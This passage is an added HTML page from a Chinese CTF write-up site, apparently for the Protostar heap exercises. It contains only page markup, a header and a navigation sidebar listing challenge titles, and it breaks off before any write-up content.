@@ -1,0 +1,3747 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="YanhuiJessica">
+      
+      
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/wargames/protostar/heap/">
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.3.3">
+    
+    
+      
+        <title>Exploit Education：Protostar - Heap - Chictf-Writeups</title>
+      
+    
+    
+  
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.4a0965b7.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+      
+    
+<style>
+  .md-typeset h1 {
+    color:var(--md-default-fg-color--light);
+    font-size:2em;
+    line-height:1.3;
+    margin:0 0 1em;
+  }
+</style>
+
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="red">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#heap-0" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Chictf-Writeups" class="md-header__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Chictf-Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exploit Education：Protostar - Heap
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    YanhuiJessica/Chictf-Writeups
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        简介
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../misc/unpleasant_music/" class="md-tabs__link">
+        Misc
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../web/t_star_upload_bypass/" class="md-tabs__link">
+        Web
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../reverse/easyre/" class="md-tabs__link">
+        Reverse
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../pwn/when_did_you_born/" class="md-tabs__link">
+        Pwn
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../crypto/bank/" class="md-tabs__link">
+        Crypto
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../blockchain/code_is_law/" class="md-tabs__link">
+        Blockchain
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../natas/" class="md-tabs__link md-tabs__link--active">
+        Wargames
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../eggs/ctfhub_index/" class="md-tabs__link">
+        彩蛋
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Chictf-Writeups" class="md-nav__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>
+
+    </a>
+    Chictf-Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/YanhuiJessica/Chictf-Writeups" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    YanhuiJessica/Chictf-Writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1">
+          简介
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="简介" data-md-level="1">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          简介
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        首页
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../how_to_participate/" class="md-nav__link">
+        如何参与
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Misc
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Misc" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Misc
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/unpleasant_music/" class="md-nav__link">
+        Unpleasant music
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/leaf_cover_eyes/" class="md-nav__link">
+        一叶障目
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/difficult_programming_language/" class="md-nav__link">
+        Difficult Programming Language
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/secret_information/" class="md-nav__link">
+        机密信息
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/hide_and_seek/" class="md-nav__link">
+        藏藏藏
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/targz_y1ng/" class="md-nav__link">
+        TARGZ-y1ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/gakki/" class="md-nav__link">
+        gakki
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_8" type="checkbox" id="__nav_2_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_8">
+          HackerGame 2020
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2020" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_8">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2020
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/account_bot/" class="md-nav__link">
+        从零开始的记账工具人
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/gibberish_message/" class="md-nav__link">
+        从零开始的火星文生活
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/self_repeating_repeater/" class="md-nav__link">
+        自复读的复读机
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/233_string_tool/" class="md-nav__link">
+        233 同学的字符串工具
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/233_docker/" class="md-nav__link">
+        233 同学的 Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/4f_system_middle/" class="md-nav__link">
+        来自一教的图片
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/basic_math_simulator/" class="md-nav__link">
+        超基础的数理模拟器
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/stegano50/" class="md-nav__link">
+        Stegano50
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/newsctf_all_reverse/" class="md-nav__link">
+        NEWSCTF - ！了反都，了反
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/audio_frequency_stego/" class="md-nav__link">
+        audio-frequency-stego
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_12" type="checkbox" id="__nav_2_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_12">
+          DeconstruCT.F 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DeconstruCT.F 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_12">
+          <span class="md-nav__icon md-icon"></span>
+          DeconstruCT.F 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/pirates/" class="md-nav__link">
+        Pirates
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/teg_rads/" class="md-nav__link">
+        Teg Rads
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/hearing_not_believing/" class="md-nav__link">
+        HearingNotBelieving
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_14" type="checkbox" id="__nav_2_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_14">
+          HackerGame 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_14">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/transparent_file/" class="md-nav__link">
+        透明的文件
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/encrypted_u_disk/" class="md-nav__link">
+        加密的 U 盘
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/p_q/" class="md-nav__link">
+        p😭q
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_15" type="checkbox" id="__nav_2_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_15">
+          西湖论剑 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="西湖论剑 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_15">
+          <span class="md-nav__icon md-icon"></span>
+          西湖论剑 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/yusa_little_secret/" class="md-nav__link">
+        YUSA的小秘密
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/yusa_secret/" class="md-nav__link">
+        Yusa的秘密
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/compress_the_flag/" class="md-nav__link">
+        Compress The Flag
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/s_script_gi/" class="md-nav__link">
+        s/&lt;script&gt;//gi
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/log4_sanity_check/" class="md-nav__link">
+        Log 4 sanity check
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/bishop_duel/" class="md-nav__link">
+        Bishop Duel
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/lighthouse/" class="md-nav__link">
+        Lighthouse
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../misc/last_digit/" class="md-nav__link">
+        last digit
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/t_star_upload_bypass/" class="md-nav__link">
+        文件上传 JS 绕过
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/t_star_tomcat/" class="md-nav__link">
+        小猫咪踩灯泡
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/ctfhub_reflected_xss/" class="md-nav__link">
+        CTFHub - 反射型 XSS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/initiative/" class="md-nav__link">
+        主动
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/funhash/" class="md-nav__link">
+        Funhash
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/xss_game/" class="md-nav__link">
+        XSS Game
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/web_php_include/" class="md-nav__link">
+        Web php include
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/ctfhub_git_leakage/" class="md-nav__link">
+        CTFHub - Git 泄露
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/newsctf_easy_web/" class="md-nav__link">
+        NEWSCTF - easy_web
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/heres_a_flag/" class="md-nav__link">
+        Here's a Flag
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_11" type="checkbox" id="__nav_3_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_11">
+          HackerGame 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackerGame 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_11">
+          <span class="md-nav__icon md-icon"></span>
+          HackerGame 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/sale_melon/" class="md-nav__link">
+        卖瓜
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/flag_red_packet/" class="md-nav__link">
+        FLAG 助力大红包
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/info_above_graph/" class="md-nav__link">
+        图之上的信息
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/most_secure_crypto_algo/" class="md-nav__link">
+        Most Secure Crypto Algo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/calculus_calc_exercise/" class="md-nav__link">
+        微积分计算小练习
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Reverse
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Reverse" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Reverse
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../reverse/easyre/" class="md-nav__link">
+        EasyRe
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../reverse/z3/" class="md-nav__link">
+        z3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../reverse/newsctf_re_signin/" class="md-nav__link">
+        NEWSCTF - re_signin
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          Pwn
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Pwn
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/when_did_you_born/" class="md-nav__link">
+        when did you born
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/amnesia/" class="md-nav__link">
+        Amnesia
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          Crypto
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Crypto" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Crypto
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/bank/" class="md-nav__link">
+        bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/shanghai/" class="md-nav__link">
+        shanghai
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/easy_rsa/" class="md-nav__link">
+        easy_RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/normal_rsa/" class="md-nav__link">
+        Normal_RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/easy_ecc/" class="md-nav__link">
+        easy_ECC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
